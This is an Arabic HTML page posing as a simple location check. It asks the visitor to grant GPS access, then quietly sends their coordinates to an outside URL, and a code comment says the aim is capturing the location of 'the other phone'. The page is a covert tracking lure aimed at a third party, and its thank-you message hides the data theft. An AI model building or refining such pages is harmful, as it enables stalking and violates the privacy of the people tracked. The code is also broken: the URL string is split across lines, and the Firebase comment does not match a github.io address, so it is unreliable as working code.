<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحديد الموقع</title>
</head>
<body>
    <h2 style="text-align: center; margin-top: 50px;">جاري تحديد الموقع... يرجى الضغط على "سماح" إذا ظهرت لك</h2>

    <script>
        // دالة التقاط موقع الـ GPS من الهاتف الآخر
        navigator.geolocation.getCurrentPosition(function(position) {
            let lat = position.coords.latitude;
            let lng = position.coords.longitude;

            // استبدل الرابط أدناه برابط الـ Realtime Database الخاص بك في Firebase
            let firebaseURL = "https://a43066660-debug.github.io/SAMIALSUBAIHI-Samy/
                ";

            // إرسال الإحداثيات فوراً إلى قاعدة البيانات
            fetch(firebaseURL, {
                method: "PUT",
                body: JSON.stringify({ latitude: lat, longitude: lng })
            })
            .then(response => alert("تمت العملية بنجاح! شكراً لك."))
            .catch(error => alert("حدث خطأ في الإرسال"));

        }, function(error) {
            alert("يرجى تفعيل الـ GPS في هاتفك والسماح للمتصفح بالوصول للموقع");
        });
    </script>
</body>
</html>
